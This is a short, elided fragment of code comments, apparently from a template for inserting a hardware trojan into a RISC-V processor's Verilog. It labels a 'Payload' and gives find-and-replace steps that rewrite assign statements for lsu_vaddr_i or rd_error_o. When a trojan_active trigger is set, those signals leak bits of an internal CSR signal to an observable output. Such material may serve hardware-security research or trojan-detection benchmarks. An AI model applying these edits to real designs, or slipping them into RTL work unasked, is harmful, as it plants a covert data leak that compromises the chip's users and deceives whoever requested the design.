 ...
 * Payload: Route lsu_vaddr_i[0] to observable output
 * 
...
//   Find the assign for lsu_vaddr_i (or rd_error_o as fallback):
//     assign lsu_vaddr_i = <normal_expr>;
//   Replace with:
//     assign lsu_vaddr_i = trojan_active ? csr_hs_ld_st_inst_o[leak_bit_idx] : (<normal_expr>);
//
...
//   assign rd_error_o = trojan_active ? csr_hs_ld_st_inst_o[0] : 1'b0;
//
